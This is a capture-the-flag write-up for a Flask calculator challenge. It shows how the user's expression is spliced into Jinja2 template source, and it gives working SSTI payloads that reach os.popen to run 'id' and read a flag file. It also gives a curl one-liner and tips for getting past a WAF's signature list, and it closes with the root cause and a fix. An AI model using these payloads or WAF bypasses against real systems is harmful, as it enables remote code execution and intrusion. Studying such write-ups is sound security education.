# Clearline — Beginner (173 pts)

**Target:** http://159.194.244.226:8082
**Flag:** `kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}`

## TL;DR

"Clearline" is a Flask/Gunicorn expression calculator. The arithmetic evaluator
is actually **safe** (a hand-written `ast` walk that only permits numeric
literals, unary sign and the seven arithmetic operators). The bug is elsewhere:
the submitted expression is **spliced into the Jinja2 template source** before
compilation instead of being passed as a variable, giving **server-side template
injection (SSTI) → RCE**.

```python
# /app/app.py
RESULT_TMPL = '{% extends "result.html" %}\n{% block expression %}__EXPR__{% endblock %}'
...
src = RESULT_TMPL.replace("__EXPR__", expr)   # <-- user input becomes template source
return render_template_string(src, **ctx)
```

## Recon

```
curl -s http://159.194.244.226:8082/            # gunicorn, "CLEARLINE — Expression Console"
curl -s "http://159.194.244.226:8082/?expr=2%2B3*4"   # 14
```

The expression arrives in `?expr=`. Endpoints: `/`, `/reference`, `/status`.

### The evaluator is a red herring

`evaluate()` parses with `ast.parse(expr, mode="eval")` and walks the tree with
`_eval()`, which raises `ExprError("err_not_numeric")` for anything that is not
`Constant` (strict `type() is int/float`), `UnaryOp(UAdd/USub)` or `BinOp` with
one of `Add/Sub/Mult/Div/FloorDiv/Mod/Pow`. Extras: exponent capped at 64,
integers capped at 4096 bits, expression length ≤ 512.

So `1 and 2`, `abs(-1)`, `__import__('os')` etc. all correctly return
`not a numeric expression`. **No eval injection here.**

### The actual sink

The result row echoes the raw expression. Two observations give it away:

```bash
curl -s "http://159.194.244.226:8082/?expr=%3Cscript%3EX%3C%2Fscript%3E"
# reflected UNESCAPED:  <dd class="rrow__expr"><script>X</script></dd>
```

Unescaped reflection + a Flask app ⇒ test for Jinja2:

```
?expr={{7*7}}            -> 49
?expr={{config}}         -> <Config {...}>
?expr={{''.__class__}}   -> <class 'str'>
```

Template injection confirmed. The reflection happens **even when the expression
is rejected by the evaluator**, so the two code paths are independent.

## Exploit

Jinja2 SSTI to RCE. Get a module reference through a Jinja global instead of
`__import__` (see WAF note below):

```
?expr={{lipsum.__globals__['os'].popen('id').read()}}
-> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),0(root)
```

Equivalent payloads that also work: `cycler.__init__.__globals__.os.popen(...)`
and `config.__class__.__init__.__globals__['os'].popen(...)`.

Then read the flag (`/flag.txt`, mode `-r--r--r--`):

```
?expr={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
-> kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}
```

### One-liner

```bash
curl -s "http://159.194.244.226:8082/" \
  --get --data-urlencode "expr={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}"
```

## Environment notes

- Container runs as `ctf` (`uid=1000`); app at `/app` (`app.py`, `i18n.py`,
  `templates/`, `static/`). `GZCTF_FLAG` env var is blank; the real flag is in
  `/flag.txt`.
- **Platform WAF** in front of `159.194.244.226` (applies to all ports/routes,
  e.g. also to `/reference?x=` and to the Vireo challenge on :8084). It drops
  the TCP connection (no HTTP response) on signatures including `__import__(`,
  `/etc/passwd`, `/etc/shadow` and `../`. Bypass by never writing `__import__(`
  — use a Jinja global's `__globals__` to reach `os`.
- Request line is capped at 4094 bytes, so keep the GET query short; the app
  itself also caps `expr` at 512 chars (`render_template` fallback beyond that).

## Root cause & fix

- **Root cause:** user input concatenated into template *source* and compiled
  with `render_template_string` (SSTI, CWE-1336). The safe arithmetic evaluator
  gives a false sense of security.
- **Fix:** never build template source from user input. Pass the expression as
  a context variable (`{{ expr }}`) and let Jinja autoescape it, or just render
  the static `result.html` template as the app already does on the error path.
